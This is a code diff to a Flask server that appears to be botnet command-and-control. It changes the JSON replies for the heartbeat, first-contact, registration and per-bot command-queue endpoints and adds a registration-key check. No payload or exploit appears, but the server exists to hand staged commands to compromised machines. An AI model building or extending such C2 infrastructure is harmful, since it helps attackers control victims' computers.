@@ -137,9 +137,9 @@ def heartbeat():
         query_bot.set_timestamp(datetime.now())
 
     except Exception as e:
-        return jsonify({'error': '[-] Heartbeat not available for you'})
+        return jsonify({'result': 'fail', 'error': '[-] Heartbeat not available for you'})
 
-    return 'heartbeat'
+    return jsonify({'result': 'success'})
 
 @app.route('/firstcontact', methods=['POST'])
 def firstcontact(): 
@@ -164,7 +164,7 @@ def firstcontact():
     if firstcontact == FIRSTCONTACTKEY:
         return jsonify({'result': 'success', 'registerkey': 'registerkey'})
     else:
-        return jsonify({'error': 'wrong firstcontactkey'})
+        return jsonify({'result': 'fail', 'error': 'wrong firstcontactkey'})
 
 @app.route('/register', methods=['POST'])
 def register():
@@ -192,6 +192,10 @@ def register():
     bot_user = data['user']
 
     # API Endpoint logic 
+    # Check if the registerkey is correct 
+    if registerkey != REGISTERKEY:
+        return jsonify({'result': 'fail', 'error': 'Wrong registerkey'})
+
     # Check bot already exists in the database 
     try:
         query_bot = Bot.query.filter_by(ip=bot_ip).filter_by(user=bot_user).first()
@@ -199,7 +203,7 @@ def register():
         print("[!]", e)
 
     if query_bot is not None:
-        return jsonify({'error': 'Bot already registered'})
+        return jsonify({'result': 'fail', 'error': 'Bot already registered'})
 
     else:
         print("[+] Added a new bot !")
@@ -207,7 +211,7 @@ def register():
         db.session.add(bot)
         db.session.commit()
 
-        return jsonify({'result': 'Bot was added'})
+        return jsonify({'result': 'success'})
 
 
 @app.route('/bot/<bot_ip>/push', methods=['POST'])
@@ -281,19 +285,19 @@ def bottask(bot_ip):
             query_bot.set_timestamp(datetime.now())
 
         except Exception as e:
-            return jsonify({'error' : '[-] There are no commands for you'})
+            return jsonify({'result': 'fail', 'error' : '[-] There are no commands for you'})
 
         # Try getting commands, from the oldest staged command to the lastest staged command. 
         try:
             command = query_bot.cmds[0]
         except Exception as e:
-            return jsonify({'error': '[-] There are no commands available'})
+            return jsonify({'result': 'fail', 'error': '[-] There are no commands available'})
 
-        return jsonify({ 'command': command.cmd })
+        return jsonify({ 'result': 'success', 'command': command.cmd })
 
 
     except Exception as e:
-        return jsonify({ 'error': str(e) }) 
+        return jsonify({ 'result': 'fail', 'error': str(e) }) 
 
 @app.route('/bot/<bot_ip>/result', methods=['POST'])
 def botresult(bot_ip):
